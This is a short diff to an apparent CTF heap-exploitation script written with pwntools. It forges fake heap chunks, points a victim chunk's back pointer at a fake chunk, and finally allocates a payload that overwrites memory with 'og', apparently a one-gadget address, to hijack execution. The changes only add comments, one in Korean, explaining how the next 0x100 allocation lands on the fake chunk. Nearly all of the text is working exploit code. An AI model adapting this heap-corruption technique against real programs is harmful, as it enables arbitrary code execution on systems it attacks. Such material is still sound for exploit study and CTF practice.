@@ -50,9 +50,11 @@ fakechunk = b"\x00"*8 + p64(0x111) + p64(chunk_addr-0x10) + p64(name_addr + 0x20
 # Fakechunk2->fd = Fakechunk1
 fakechunk += p64(0) + p64(0) + p64(name_addr) # bk
 edit_name(fakechunk)
+
+# victim->bk = Fakechunk1
 payload = b"A"*8 + p64(name_addr)
 edit(0, payload)
-add(0x100, b"AAAA")
+add(0x100, b"AAAA") # victim 할당 -> 다음 0x100 할당 요청 시 Fake Chunk 1에 할당
 
 payload = b"A"*104 + p64(og)
 add(0x100, payload)
